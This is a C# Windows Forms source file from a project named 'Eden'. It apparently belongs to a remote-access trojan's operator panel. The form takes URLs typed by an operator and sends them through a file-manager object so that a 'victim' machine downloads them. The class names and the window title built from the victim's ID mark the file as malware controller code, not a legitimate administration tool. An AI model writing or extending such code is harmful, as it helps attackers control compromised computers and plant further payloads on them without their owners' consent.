using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileWGET : Form
    {
        public frmFileMgr m_fMgr { get; init; }
        public clsVictim m_victim { get; init; }

        public frmFileWGET(frmFileMgr frmMgr, clsVictim victim)
        {
            InitializeComponent();

            m_fMgr = frmMgr;
            m_victim = victim;

            Text = @$"WGET\\{m_victim.m_szID}";
        }

        void setup()
        {
            if (m_fMgr == null)
            {
                MessageBox.Show("m_fMgr is null.", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
                return;
            }
        }

        private void frmFileWGET_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            List<string> lsUrls = textBox1.Lines.Where(x => !string.IsNullOrEmpty(x.Trim())).ToList();
            m_fMgr.SendWget(lsUrls);
        }
    }
}
